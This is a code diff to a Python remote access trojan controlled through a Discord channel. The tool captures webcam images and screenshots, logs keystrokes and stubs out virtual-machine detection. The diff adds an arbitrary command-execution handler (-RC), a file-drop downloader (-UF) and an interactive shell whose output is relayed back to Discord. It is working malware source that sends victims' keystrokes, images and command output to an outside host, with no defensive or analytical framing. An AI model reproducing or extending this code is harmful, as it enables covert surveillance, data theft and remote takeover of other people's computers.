@@ -1,4 +1,5 @@
 import os
+import requests
 import subprocess
 import threading
 import asyncio
@@ -11,7 +12,6 @@ import time
 import cv2
 import mss
 from win32com.client import Dispatch
-from discord.ext import tasks
 from PIL import Image
 import keyboard
 from mss import mss
@@ -26,6 +26,7 @@ first_execution = False
 mode = "default"
 
 shell_process = None
+shell_process_stdout = ""
 
 profile_data = None
 
@@ -46,12 +47,11 @@ client = discord.Client(intents=intents)
 
 
 @client.event
-async def on_ready():   # sobald der client sich mit discord verbunden hat
+async def on_ready():   # when the client connected to discord
     global profile_data
     global first_execution
 
     print(f'logged in as {client.user}')
-    periodic_update_loop.start()
 
     print("start up")
     if first_execution:
@@ -72,7 +72,7 @@ async def on_ready():   # sobald der client sich mit discord verbunden hat
 
 
 @client.event
-async def on_message(message):  # wenn discord message erkannt wird
+async def on_message(message):  # when discord message was received
     global mode
     global shell_process
     # profile data laden
@@ -85,14 +85,13 @@ async def on_message(message):  # wenn discord message erkannt wird
             await return_error_2_channel(e)
 
     content = message.content
-    # nach dem channel mit richtigem namen suchen
+    # searching for channel with the profiles channel name
     channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
 
-    # eigene und messages aus anderen channels aussortieren
+    # ignore messages send by beacon/client
     if message.author == client.user or str(message.channel) != profile_data["channel_name"]:
         return
 
-    # print("message received")
     match mode:
         case "default":
             # getting the first part of content until white space
@@ -134,45 +133,82 @@ async def on_message(message):  # wenn discord message erkannt wird
                 case "-GLK":    # GET LOGGED KEYS
                     send_logged_key_2_discord()
 
-        case "shell":
-                print(mode)
-                if content.startswith("quit"):
-                    mode = "default"
-                    if shell_process:
-                        shell_process.terminate()
-                        await channel.send("**CMD SHELL TERMINATED**")
-                        return
+                case "-UF":     # UPLOAD FILE
+                    download_attached_file(message)
 
+                case "-RC":     # RUN COMMAND
+                    print("-RC")
+                    content = content.strip("-RC")
+                    response = os.popen(content).read()
+                    await channel.send(response)
+
+        case "shell":   # active shell
+            # terminate shell if the user sends quit
+            if content.startswith("quit"):
+                mode = "default"
+                if shell_process:
+                    shell_process.terminate()
                     await channel.send("**CMD SHELL TERMINATED**")
                     return
 
-                print(content)
+                await channel.send("**CMD SHELL TERMINATED**")
+                return
 
-                if shell_process:
-                    shell_process.stdin.write(content + "\n")
-                    shell_process.stdin.flush()
+            if shell_process:
+                # execute message send by user / add flag to know when the command has finished
+                shell_process.stdin.write(content + " & echo RESPONSE_FINISHED_FLAG" + "\n")
+                shell_process.stdin.flush()
 
-                    # Start a new thread to read the output
-                    threading.Thread(target=send_shell_output_2_discord, daemon=True).start()
+                # Start a new thread to read the output
+                await send_shell_output_2_discord()
+                #threading.Thread(target=send_shell_output_2_discord, daemon=True).start()
 
-def send_shell_output_2_discord():
+
+async def send_shell_output_2_discord():
     global shell_process
     channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
+    flag_counter = 0
+    output = ""
+    time_stamp = time.time()
+    print(time_stamp)
 
     while True:
-        output = shell_process.stdout.readline()
-        if not output:
+        # read each line of the response
+        try:
+            line = await asyncio.to_thread(shell_process.stdout.readline)
+        except:
+            line = "\n"
+
+        # save each line in outputs
+        output += line
+
+        # Checking for the flag / second flag = command finished
+        if "RESPONSE_FINISHED_FLAG" in line:
+            flag_counter += 1
+        if flag_counter == 2:
             break
-        asyncio.run_coroutine_threadsafe(channel.send(output), client.loop)
-        time.sleep(0.3)
+
+        # sending the output early if the command takes too long
+        if time.time() - time_stamp > 1:
+            print("early send")
+            await channel.send(output)
+            output = ""
+            time_stamp = time.time()
+
+    print("break")
+    print(output)
+    await channel.send(output)
+
 
 
 def check_for_vm():
+    # TODO check for typical vm names
+    # TODO find solution to detect the windows defender vm
     return False
 
 
 async def create_channel():
-    # neuen channel erstellen
+    # create new channel
     try:
         with open("profile.json", "r") as json_file:
             profile_data = json.load(json_file)
@@ -205,17 +241,18 @@ async def return_error_2_channel(error_message):
     except:
         print("error returning error")
 
+
 async def take_picture(cam_index):
     global profile_data
     print("-TP")
     try:
-        # aufnehmen des fotos
+        # taking a picture
         cam = cv2.VideoCapture(cam_index)
         ret, frame = cam.read()
         cam.release()
         cv2.imwrite("captured_frame.jpg", frame)
 
-        # senden des fotos
+        # sending picture into the discord channel
         if not profile_data:
             with open("profile.json", "r") as json_file:
                 profile_data = json.load(json_file)
@@ -250,7 +287,7 @@ async def take_screenshot(screen_index):
         channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
         with open("captured_screen.png", 'rb') as image_file:
             if screen_index == 0:
-                screen_index = "ALL"    # screen index von 0 auf ALL string für besseren discord output
+                screen_index = "ALL"    # replacing screen index 0 with ALL string for better readability
 
             await channel.send(content=f"**{profile_data["user_name"]}\t-\t{datetime.now()}\t-\tscreen:{screen_index}**",
                                file=discord.File(image_file, "image.jpg"))
@@ -286,12 +323,13 @@ def on_key_event(event):
             keys_pressed = []
 
 
-def start_key_logger():     # risky i think     # TODO add extra channel for key logger
+def start_key_logger():     # risky i think     # TODO add extra channel for key logger (maybe)
     global keyboard_hook
     keyboard_hook = keyboard.on_press(on_key_event)
     # create log file
     with open("log.l", "w"):
         pass
+
 
 def send_logged_key_2_discord():
     global keys_pressed
@@ -333,6 +371,28 @@ def stop_key_logger():
 
     except Exception as e:
         return_error_2_channel(e)
+
+
+def download_attached_file(message):
+    try:
+        url = str(message.attachments[0])
+        # get file from server
+        response = requests.get(url, allow_redirects=True)
+
+        # get file name from url (only works with discord url)
+        question_mark_index = url.find("?")
+        filename = url[:question_mark_index]
+        last_slash_index = filename.rfind("/")
+        filename = filename[last_slash_index + 1:]
+
+        # save file on disc as filename
+        with open(filename, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=8192):
+                # Write each chunk to the file
+                file.write(chunk)
+
+    except Exception as e:
+            return_error_2_channel(e)
 
 
 def create_flag():
@@ -387,11 +447,6 @@ def create_unique_profile():
         json.dump(profile, f)
 
 
-@tasks.loop(seconds=1)
-async def periodic_update_loop():
-    pass
-
-
 def main():
     global first_execution
     # checking for a vm
@@ -418,6 +473,7 @@ def main():
 
     # starting discord bot
     client.run(TOKEN)
+
 
 if __name__ == '__main__':
     main()
